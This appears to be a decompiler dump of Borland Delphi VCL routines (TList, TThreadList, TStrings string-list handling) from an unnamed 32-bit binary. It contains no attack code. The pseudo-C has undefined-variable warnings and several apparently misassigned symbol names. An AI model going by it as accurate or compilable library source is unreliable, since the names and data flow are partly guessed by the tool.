  if ( capacity != *(_DWORD *)(self + 12) )
  {
    __linkproc__ ReallocMem((void **)(self + 4), 4 * capacity);
    *(_DWORD *)(self + 12) = capacity;
  }
}
// 41DBCC: using guessed type int **off_41DBCC[9];

//----- (0040C2E4) --------------------------------------------------------
__int16 __usercall Classes::TList::SetCount@<ax>(int a1@<edx>, _DWORD *a2@<eax>)
{
  int v5; // eax
  int v6; // ebp
  int v7; // edi

  if ( a1 < 0 || a1 > 0x7FFFFFF )
    Classes::TList::Error(a1, (int)off_41DB94[0]);
  if ( a1 > a2[3] )
    TList::SetCapacity((int)a2, a1);
  v5 = a2[2];
  if ( a1 <= v5 )
  {
    v6 = v5 - 1;
    if ( a1 <= v5 - 1 )
    {
      v7 = a1 - v5;
      do
      {
        LOWORD(v5) = Classes::TList::Delete(v6--, a2);
        ++v7;
      }
      while ( v7 );
    }
  }
  else
  {
    LOWORD(v5) = sub_4028D4((char *)(a2[1] + 4 * v5), 4 * (a1 - v5), 0);
  }
  a2[2] = a1;
  return v5;
}
// 41DB94: using guessed type int **off_41DB94[23];

//----- (0040C358) --------------------------------------------------------
char *__usercall Classes::TThreadList::TThreadList@<eax>(char *a1@<eax>, char a2@<dl>)
{
  char v3; // bl
  char *v4; // esi
  int v5; // eax
  char v7; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (char *)System::__linkproc__ ClassCreate((int)a1, a2, v7);
  v3 = a2;
  v4 = a1;
  TObject_Create(a1);
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(v4 + 8));
  TObject_Create(&off_40B908);
  *((_DWORD *)v4 + 1) = v5;
  v4[32] = 0;
  if ( v3 )
    sub_402D34(v4);
  return v4;
}
// 40C361: variable 'v7' is possibly undefined
// 40C366: variable 'a2' is possibly undefined
// 40C388: variable 'v5' is possibly undefined
// 40B908: using guessed type void *off_40B908;

//----- (0040C3AC) --------------------------------------------------------
void __usercall TThreadList::~TThreadList(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  unsigned int v5[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v6; // [esp-4h] [ebp-Ch]
  char v7; // [esp+3h] [ebp-5h]
  _DWORD *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v3 = sub_402D3C(a1, a2);
  v7 = v4;
  v8 = v3;
  sub_40C4B0((int)v3);
  v6 = &savedregs;
  v5[1] = (unsigned int)System::__linkproc__ HandleFinally;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_402BDC((_DWORD *)v8[1]);
  sub_402BCC(v8, v7 & 0xFC);
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40C415;
  sub_40C514((int)v8);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v8 + 2));
  if ( v7 > 0 )
    sub_402D2C(v8);
}
// 40C3B7: variable 'v4' is possibly undefined
// 40C40E: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);

//----- (0040C428) --------------------------------------------------------
void __usercall Classes::TThreadList::Add(void *a1@<edx>, int a2@<eax>)
{
  Classes::TList *v4; // ecx
  unsigned int v5[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v6; // [esp-4h] [ebp-Ch]
  int v7; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v7 = a2;
  sub_40C4B0(a2);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40C4A4;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( *(_BYTE *)(v7 + 32) == 1 || sub_40C268(*(_DWORD *)(v7 + 4), (int)a1) == -1 )
  {
    Classes::TList::Add(v4, a1, *(_DWORD **)(v7 + 4));
  }
  else if ( *(_BYTE *)(v7 + 32) == 2 )
  {
    Classes::TList::Error((int)a1, (int)off_41DB84[0]);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40C4AB;
  sub_40C514(v7);
}
// 40C469: variable 'v4' is possibly undefined
// 41DB84: using guessed type int **off_41DB84[27];

//----- (0040C4B0) --------------------------------------------------------
int __usercall sub_40C4B0@<eax>(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  return *(_DWORD *)(a1 + 4);
}

//----- (0040C4C4) --------------------------------------------------------
void __usercall Classes::TThreadList::Remove(void *a1@<edx>, int a2@<eax>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = a2;
  sub_40C4B0(a2);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_40C507;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_40C288(*(_DWORD **)(v6 + 4), (int)a1);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_40C50E;
  sub_40C514(v6);
}

//----- (0040C514) --------------------------------------------------------
void __usercall sub_40C514(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (0040C520) --------------------------------------------------------
void __usercall TStored_Destroy_7(int self@<eax>)
{
  char v1; // dl
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C((_DWORD *)self, v1);
  v4 = v3;
  v5 = v2;
  Classes::RemoveFixups((int)v2);
  sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 40C522: variable 'v1' is possibly undefined
// 40C527: variable 'v3' is possibly undefined

//----- (0040C54C) --------------------------------------------------------
void __usercall sub_40C54C(int *a1@<eax>, void (***a2)(void)@<edx>)
{
  if ( a2 )
    (**a2)();
  else
    Classes::TPersistent::AssignError(a1, 0);
}

//----- (0040C560) --------------------------------------------------------
void __usercall Classes::TPersistent::AssignError(int *a1@<eax>, int *a2@<edx>)
{
  void *v3; // edx
  LStr *v4; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // [esp-Ch] [ebp-128h] BYREF
  DWORD v6; // [esp-8h] [ebp-124h]
  int *v7; // [esp-4h] [ebp-120h]
  const ULONG_PTR *v8[3]; // [esp+0h] [ebp-11Ch]
  LStr *v9; // [esp+Ch] [ebp-110h]
  unsigned __int8 *v10; // [esp+10h] [ebp-10Ch]
  char v11; // [esp+14h] [ebp-108h]
  unsigned __int8 v12[256]; // [esp+18h] [ebp-104h] BYREF
  const ULONG_PTR *v13; // [esp+118h] [ebp-4h] BYREF
  int savedregs; // [esp+11Ch] [ebp+0h] BYREF

  v13 = 0;
  v7 = &savedregs;
  v6 = (DWORD)&loc_40C616;
  v5 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v5);
  if ( a2 )
  {
    sub_402B5C(*a2, v12);
    sub_4036EC((BYTE **)&v13, v12);
  }
  else
  {
    __linkproc__ LStrLAsg((char **)&v13, (char *)&dword_40C62C);
  }
  v8[2] = v13;
  LOBYTE(v9) = 11;
  sub_402B5C(*a1, v12);
  v10 = v12;
  v11 = 4;
  LOBYTE(v3) = 1;
  Sysutils::Exception::Exception(dword_406844, v3, off_41DB9C[0]);
  sub_402F98((DWORD)v5, v6, (DWORD)v7, v8[0]);
  v4 = v9;
  __writefsdword(0, (unsigned int)v8[1]);
  v9 = (LStr *)&loc_40C61D;
  System::__linkproc__ LStrClr(v4);
}
// 40C5F6: variable 'v3' is possibly undefined
// 406844: using guessed type int dword_406844[4];
// 40C62C: using guessed type int dword_40C62C;
// 41DB9C: using guessed type int **off_41DB9C[21];

//----- (0040C63C) --------------------------------------------------------
void __usercall Classes::TPersistent::GetNamePath(int *a1@<eax>, BYTE **a2@<edx>)
{
  int v5; // eax
  int *v6; // eax
  LStr *v7; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-11Ch] BYREF
  void *v9; // [esp-8h] [ebp-118h]
  int *v10; // [esp-4h] [ebp-114h]
  LStr *v11; // [esp+0h] [ebp-110h]
  unsigned __int8 v12[256]; // [esp+Ch] [ebp-104h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v13; // [esp+10Ch] [ebp-4h]
  int savedregs; // [esp+110h] [ebp+0h] BYREF

  v13 = 0;
  v10 = &savedregs;
  v9 = &loc_40C6D1;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_402B5C(*a1, v12);
  sub_4036EC(a2, v12);
  sub_402C88(a1, -1);
  if ( v5 )
  {
    sub_402C88(a1, -1);
    sub_402C88(v6, -2);
    if ( v13 )
    {
      v8 = v13;
      System::__linkproc__ LStrCatN((char **)a2, 3);
    }
  }
  v7 = v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40C6D8;
  System::__linkproc__ LStrClr(v7);
}
// 40C686: variable 'v5' is possibly undefined
// 40C69A: variable 'v6' is possibly undefined

//----- (0040C6F0) --------------------------------------------------------
void __usercall Cxtl::TcxTreeListCustomizing::~TcxTreeListCustomizing(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v3; // eax
  char v4; // dl
  char v5; // bl
  _DWORD *v6; // esi

  v3 = sub_402D3C(a1, a2);
  v5 = v4;
  v6 = v3;
  Classes::TStrings::SetStringsAdapter((int)v3, 0);
  TStored_Destroy_7((int)v6);
  if ( v5 > 0 )
    sub_402D2C(v6);
}
// 40C6F7: variable 'v4' is possibly undefined

//----- (0040C720) --------------------------------------------------------
int __usercall Classes::TStrings::Add@<eax>(Classes::TStrings *this@<ecx>, int System::AnsiString@<edx>, int a3@<eax>)
{
  int v5; // esi

  v5 = (*(int (__thiscall **)(Classes::TStrings *))(*(_DWORD *)a3 + 20))(this);
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a3 + 84))(System::AnsiString, v5);
  return v5;
}

//----- (0040C744) --------------------------------------------------------
int __usercall Classes::TStrings::AddObject@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v4; // esi

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 52))();
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a2, v4);
  return v4;
}

//----- (0040C768) --------------------------------------------------------
void __usercall TStrings::AddStrings(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v2; // eax
  int v3; // esi
  int v4; // ebx
  int v5; // eax
  LStr *v6; // ecx
  _DWORD v7[3]; // [esp-18h] [ebp-30h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  LStr *v11; // [esp+0h] [ebp-18h]
  int v12; // [esp+Ch] [ebp-Ch] BYREF
  int v13; // [esp+10h] [ebp-8h]
  _DWORD *v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = a2;
  v14 = a1;
  v10 = &savedregs;
  v9 = &loc_40C80F;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_40C890(a1);
  v7[2] = &savedregs;
  v7[1] = &loc_40C7F2;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v2 = (*(int (__stdcall **)(_DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v13 + 20))(
         v7[0],
         &loc_40C7F2,
         &savedregs,
         v8);
  if ( v2 - 1 >= 0 )
  {
    v3 = v2;
    v4 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v13 + 12))(&v12, v4);
      v5 = (*(int (__cdecl **)(int))(*(_DWORD *)v13 + 24))(v12);
      (*(void (__thiscall **)(int))(*v14 + 56))(v5);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40C7F9;
  sub_40C94C(v14);
  v6 = v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40C816;
  System::__linkproc__ LStrClr(v6);
}

//----- (0040C820) --------------------------------------------------------
void __usercall Classes::TStrings::Assign(Classes::TPersistent *a1@<edx>, int *a2@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v4; // [esp-Ch] [ebp-14h] BYREF
  void *v5; // [esp-8h] [ebp-10h]
  int *v6; // [esp-4h] [ebp-Ch]
  void *v7; // [esp+0h] [ebp-8h]
  int *v8; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v8 = a2;
  if ( sub_402C40((int *)a1, (int)&off_40BA94) )
  {
    sub_40C890(v8);
    v6 = &savedregs;
    v5 = &loc_40C879;
    v4 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v4);
    (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*v8 + 64))(v4);
    (*(void (**)(void))(*v8 + 60))();
    __writefsdword(0, (unsigned int)v5);
    v7 = &loc_40C88A;
    sub_40C94C(v8);
  }
  else
  {
    sub_40C54C(v8, (void (***)(void))a1);
  }
}
// 40BA94: using guessed type void *off_40BA94;

//----- (0040C890) --------------------------------------------------------
_DWORD *__usercall sub_40C890@<eax>(_DWORD *result@<eax>)
{
  _DWORD *v1; // ebx

  v1 = result;
  if ( !result[1] )
    result = (_DWORD *)(*(int (**)(void))(*result + 48))();
  ++v1[1];
  return result;
}

//----- (0040C8A8) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall Classes::_16681@<eax>(int a1@<ebx>, int a2)
{
  Classes::TStrings *v2; // esi
  int v3; // eax

  v2 = *(Classes::TStrings **)(*(_DWORD *)(a2 - 4) + 32);
  if ( v2 )
  {
    LOBYTE(a1) = 1;
    if ( sub_402C40(*(int **)(*(_DWORD *)(a2 - 4) + 32), (int)&off_40BA94) )
    {
      LOBYTE(v3) = Classes::TStrings::Equals(v2, *(_DWORD *)(a2 - 8));
      a1 = v3;
      LOBYTE(a1) = v3 ^ 1;
    }
  }
  else
  {
    LOBYTE(a1) = (*(int (**)(void))(**(_DWORD **)(a2 - 8) + 20))() > 0;
  }
  return a1;
}
// 40C8E0: variable 'v3' is possibly undefined
// 40BA94: using guessed type void *off_40BA94;

//----- (0040C900) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall Controls::TControl::DefineProperties@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>)
{
  int v3; // eax
  int v6; // [esp-4h] [ebp-10h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = a1;
  v3 = Classes::_16681(a3, (int)&savedregs);
  return (*(int (__fastcall **)(int, const char *, void (__usercall *)(TWriter *@<edx>, int@<eax>), int, void (__usercall *)(_DWORD *@<edx>, _DWORD *@<eax>), int))(*(_DWORD *)a2 + 4))(
           v3,
           "Strings",
           Tntwidestrings::TWideStrings::WriteData,
           a1,
           Idmultipartformdata::TIdFormDataField::SetContentType,
           v6);
}

//----- (0040C94C) --------------------------------------------------------
_DWORD *__usercall sub_40C94C@<eax>(_DWORD *result@<eax>)
{
  if ( !--result[1] )
    result = (_DWORD *)(*(int (**)(void))(*result + 48))();
  return result;
}

//----- (0040C960) --------------------------------------------------------
char __usercall Classes::TStrings::Equals@<al>(Classes::TStrings *a1@<edx>, int a2@<eax>)
{
  int v3; // ebx
  int v4; // esi
  int v5; // ebx
  char *v6; // ecx
  char v7; // zf
  LStr *v8; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // [esp-Ch] [ebp-2Ch] BYREF
  void *v11; // [esp-8h] [ebp-28h]
  int *v12; // [esp-4h] [ebp-24h]
  LStr *v13; // [esp+0h] [ebp-20h]
  char *v14; // [esp+Ch] [ebp-14h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v15; // [esp+10h] [ebp-10h] BYREF
  char v16; // [esp+17h] [ebp-9h]
  Classes::TStrings *v17; // [esp+18h] [ebp-8h]
  int v18; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v17 = a1;
  v18 = a2;
  v12 = &savedregs;
  v11 = &loc_40C9F5;
  v10 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10);
  v16 = 0;
  v3 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 20))(v10);
  if ( v3 == (*(int (**)(void))(*(_DWORD *)v17 + 20))() )
  {
    if ( v3 - 1 < 0 )
    {
LABEL_6:
      v16 = 1;
    }
    else
    {
      v4 = v3;
      v5 = 0;
      while ( 1 )
      {
        (*(void (__fastcall **)(struct _EXCEPTION_REGISTRATION_RECORD **, int))(*(_DWORD *)v18 + 12))(&v15, v5);
        v10 = v15;
        (*(void (__fastcall **)(char **, int, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v17 + 12))(
          &v14,
          v5,
          v15);
        System::__linkproc__ LStrCmp(v6, v14);
        if ( !v7 )
          break;
        ++v5;
        if ( !--v4 )
          goto LABEL_6;
      }
    }
  }
  v8 = v13;
  __writefsdword(0, (unsigned int)v11);
  v13 = (LStr *)&loc_40C9FC;
  System::__linkproc__ LStrArrayClr(v8, 2);
  return v16;
}
// 40C9CB: variable 'v6' is possibly undefined
// 40C9D0: variable 'v7' is possibly undefined

//----- (0040CA08) --------------------------------------------------------
int __usercall sub_40CA08@<eax>(int a1@<ebp>)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (0040CA0C) --------------------------------------------------------
void __userpurge sub_40CA0C(void *a1@<edx>, int a2@<ebp>, DWORD a3, DWORD a4, DWORD a5, const ULONG_PTR *a6)
{
  void *v7; // edx

  sub_40CA08(a2);
  LOBYTE(v7) = 1;
  Exception_CreateFmt(dword_40B7EC, v7, a1);
  sub_402F98(a3, a4, a5, a6);
}
// 40CA34: variable 'v7' is possibly undefined
// 40B7EC: using guessed type int dword_40B7EC[5];

//----- (0040CA44) --------------------------------------------------------
void __fastcall Tntwidestrings::TWideStrings::Error(int a1, int a2)
{
  LStr *v2; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-18h] [ebp-1Ch] BYREF
  DWORD v4; // [esp-14h] [ebp-18h]
  int *v5; // [esp-10h] [ebp-14h]
  const ULONG_PTR *v6; // [esp-Ch] [ebp-10h]
  unsigned int v7; // [esp-8h] [ebp-Ch]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v5 = &savedregs;
  v4 = (DWORD)&loc_40CA8C;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  System::LoadResString(a2, &v8);
  sub_40CA0C(v8, (int)&savedregs, (DWORD)v3, v4, (DWORD)v5, v6);
  v2 = (LStr *)v8;
  __writefsdword(0, v7);
  v8 = (BYTE *)&loc_40CA93;
  System::__linkproc__ LStrClr(v2);
}

//----- (0040CA9C) --------------------------------------------------------
void __usercall Classes::TStrings::Exchange(Classes::TStrings *this@<ecx>, int a2@<edx>, _DWORD *a3@<eax>)
{
  int v5; // eax
  LStr *v6; // ecx
  _DWORD v7[3]; // [esp-18h] [ebp-34h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-28h] BYREF
  void *v9; // [esp-8h] [ebp-24h]
  int *v10; // [esp-4h] [ebp-20h]
  LStr *v11; // [esp+0h] [ebp-1Ch]
  int v12; // [esp+Ch] [ebp-10h] BYREF
  int v13; // [esp+10h] [ebp-Ch] BYREF
  int v14; // [esp+14h] [ebp-8h]
  _DWORD *v15; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  v15 = a3;
  v10 = &savedregs;
  v9 = &loc_40CB74;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_40C890(a3);
  v7[2] = &savedregs;
  v7[1] = &loc_40CB52;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  (*(void (__fastcall **)(int *, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v15 + 12))(
    &v13,
    a2,
    v7[0],
    &loc_40CB52,
    &savedregs,
    v8);
  v14 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int *, Classes::TStrings *))(*v15 + 12))(&v12, this);
  (*(void (__fastcall **)(int, int))(*v15 + 32))(v12, a2);
  v5 = (*(int (**)(void))(*v15 + 24))();
  (*(void (__fastcall **)(int, int))(*v15 + 36))(v5, a2);
  (*(void (__fastcall **)(int, Classes::TStrings *))(*v15 + 32))(v13, this);
  (*(void (__fastcall **)(int, Classes::TStrings *))(*v15 + 36))(v14, this);
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40CB59;
  sub_40C94C(v15);
  v6 = v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40CB7B;
  System::__linkproc__ LStrArrayClr(v6, 2);
}

//----- (0040CB84) --------------------------------------------------------
int __usercall sub_40CB84@<eax>(int a1@<eax>)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 20))();
}

//----- (0040CB8C) --------------------------------------------------------
int sub_40CB8C()
{
  return 0;
}

//----- (0040CB90) --------------------------------------------------------
void __usercall TStrings_GetText(void *TStrings_Self@<eax>)
{
  char *v1; // eax
  LStr *v2; // ecx
  _DWORD v3[4]; // [esp-10h] [ebp-14h] BYREF
  char *v4; // [esp+0h] [ebp-4h]
  LStr *savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = 0;
  v3[2] = &savedregs;
  v3[1] = &loc_40CBD5;
  v3[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  (*(void (__stdcall **)(_DWORD, void *, LStr **))(*(_DWORD *)TStrings_Self + 28))(v3[0], &loc_40CBD5, &savedregs);
  v1 = sub_4038E8(v4);
  Tntwidestrutils::WStrNew(v1);
  v2 = savedregs;
  __writefsdword(0, v3[3]);
  savedregs = (LStr *)&loc_40CBDC;
  System::__linkproc__ LStrClr(v2);
}

//----- (0040CBE4) --------------------------------------------------------
void __usercall TStrings::GetTextStr(int a1@<eax>, BYTE **a2@<edx>)
{
  int v2; // eax
  int v3; // ebx
  int v4; // esi
  BYTE *v5; // ebx
  int v6; // esi
  int v7; // edi
  _BYTE *v8; // ebx
  LStr *v9; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v10; // [esp-Ch] [ebp-30h] BYREF
  void *v11; // [esp-8h] [ebp-2Ch]
  int *v12; // [esp-4h] [ebp-28h]
  LStr *v13; // [esp+0h] [ebp-24h]
  int v14; // [esp+Ch] [ebp-18h] BYREF
  BYTE *v15; // [esp+10h] [ebp-14h] BYREF
  int v16; // [esp+14h] [ebp-10h]
  int v17; // [esp+18h] [ebp-Ch]
  BYTE **v18; // [esp+1Ch] [ebp-8h]
  int v19; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v14 = 0;
  v15 = 0;
  v18 = a2;
  v19 = a1;
  v12 = &savedregs;
  v11 = &loc_40CCBB;
  v10 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v10);
  v2 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a1 + 20))(v10);
  v16 = v2;
  v3 = 0;
  if ( v2 - 1 >= 0 )
  {
    v4 = v2;
    v17 = 0;
    do
    {
      (*(void (__fastcall **)(int *, int))(*(_DWORD *)v19 + 12))(&v14, v17);
      v3 += sub_403724(v14) + 2;
      ++v17;
      --v4;
    }
    while ( v4 );
  }
  __linkproc__ LStrFromPCharLen(v18, 0, v3);
  v5 = *v18;
  if ( v16 - 1 >= 0 )
  {
    v6 = v16;
    v17 = 0;
    do
    {
      (*(void (__fastcall **)(BYTE **, int))(*(_DWORD *)v19 + 12))(&v15, v17);
      v7 = sub_403724((int)v15);
      if ( v7 )
      {
        Move(v15, v5, v7);
        v5 += v7;
      }
      *v5 = 13;
      v8 = v5 + 1;
      *v8 = 10;
      v5 = v8 + 1;
      ++v17;
      --v6;
    }
    while ( v6 );
  }
  v9 = v13;
  __writefsdword(0, (unsigned int)v11);
  v13 = (LStr *)&loc_40CCC2;
  System::__linkproc__ LStrArrayClr(v9, 2);
}

//----- (0040CCCC) --------------------------------------------------------
int __usercall Classes::TStrings::IndexOf@<eax>(char *System::AnsiString@<edx>, int a2@<eax>)
{
  int v3; // eax
  int v4; // ebx
  int v5; // esi
  LStr *v6; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-Ch] [ebp-24h] BYREF
  void *v9; // [esp-8h] [ebp-20h]
  int *v10; // [esp-4h] [ebp-1Ch]
  LStr *v11; // [esp+0h] [ebp-18h]
  char *v12; // [esp+Ch] [ebp-Ch] BYREF
  char *v13; // [esp+10h] [ebp-8h]
  int v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v12 = 0;
  v13 = System::AnsiString;
  v14 = a2;
  v10 = &savedregs;
  v9 = &loc_40CD39;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  v3 = (*(int (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 20))(v8);
  if ( v3 - 1 < 0 )
  {
LABEL_5:
    v5 = -1;
  }
  else
  {
    v4 = v3;
    v5 = 0;
    while ( 1 )
    {
      (*(void (__fastcall **)(char **, int))(*(_DWORD *)v14 + 12))(&v12, v5);
      if ( !DumbItDownFor95(v12, v13) )
        break;
      ++v5;
      if ( !--v4 )
        goto LABEL_5;
    }
  }
  v6 = v11;
  __writefsdword(0, (unsigned int)v9);
  v11 = (LStr *)&loc_40CD40;
  System::__linkproc__ LStrClr(v6);
  return v5;
}

//----- (0040CD4C) --------------------------------------------------------
int __userpurge Classes::TStrings::InsertObject@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  (*(void (__fastcall **)(int, int))(*(_DWORD *)a1 + 84))(a3, a2);
  return (*(int (__fastcall **)(int, int))(*(_DWORD *)a1 + 36))(a4, a2);
}

//----- (0040CD7C) --------------------------------------------------------
_DWORD *__usercall Classes::TStrings::LoadFromFile@<eax>(Classes::TFileStream *System::AnsiString@<edx>, int a2@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v5; // [esp-Ch] [ebp-14h] BYREF
  void *v6; // [esp-8h] [ebp-10h]
  int *v7; // [esp-4h] [ebp-Ch]
  void *v8; // [esp+0h] [ebp-8h]
  _DWORD *v9; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v9 = Classes::TFileStream::TFileStream(System::AnsiString, 1, (int)off_40BD88, 0x20u);
  v7 = &savedregs;
  v6 = &loc_40CDC4;
  v5 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v5);
  (*(void (__stdcall **)(struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 92))(v5);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_40CDCB;
  return sub_402BDC(v9);
}
// 40BD88: using guessed type int (*off_40BD88[4])();

//----- (0040CDD0) --------------------------------------------------------
void __usercall TStrings::LoadFromStream(_DWORD *a1@<eax>, int a2@<edx>)
{
  int v3; // esi
  int v4; // esi
  LStr *v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-18h] [ebp-28h] BYREF
  void *v7; // [esp-14h] [ebp-24h]
  int *v8; // [esp-10h] [ebp-20h]
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-Ch] [ebp-1Ch] BYREF
  void *v10; // [esp-8h] [ebp-18h]
  int *v11; // [esp-4h] [ebp-14h]
  LStr *v12; // [esp+0h] [ebp-10h]
  BYTE *v13; // [esp+8h] [ebp-8h] BYREF
  _DWORD *v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v13 = 0;
  v14 = a1;
  v11 = &savedregs;
  v10 = &loc_40CE6E;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  sub_40C890(a1);
  v8 = &savedregs;
  v7 = &loc_40CE51;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  v3 = Classes::TStream::GetSize(a2);
  v4 = v3 - sub_40D830(a2);
  __linkproc__ LStrFromPCharLen(&v13, 0, v4);
  (*(void (__fastcall **)(int, BYTE *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)a2 + 4))(
    v4,
    v13,
    v6,
    v7,
    v8,
    v9);
  (*(void (**)(void))(*v14 + 44))();
  __writefsdword(0, (unsigned int)v10);
  v12 = (LStr *)&loc_40CE58;
  sub_40C94C(v14);
  v5 = v12;
  __writefsdword(0, (unsigned int)v10);
  v12 = (LStr *)&loc_40CE75;
  System::__linkproc__ LStrClr(v5);
}

//----- (0040CE7C) --------------------------------------------------------
